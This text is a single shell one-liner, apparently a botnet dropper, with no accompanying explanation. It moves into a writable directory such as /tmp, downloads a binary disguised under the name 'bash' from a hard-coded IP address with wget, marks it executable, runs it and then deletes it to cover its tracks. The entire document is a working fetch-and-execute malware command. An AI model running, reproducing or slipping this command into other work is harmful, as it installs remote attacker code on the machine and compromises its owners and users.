cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://173.0.52.233/bash; chmod +x bash; ./bash; rm -rf bash
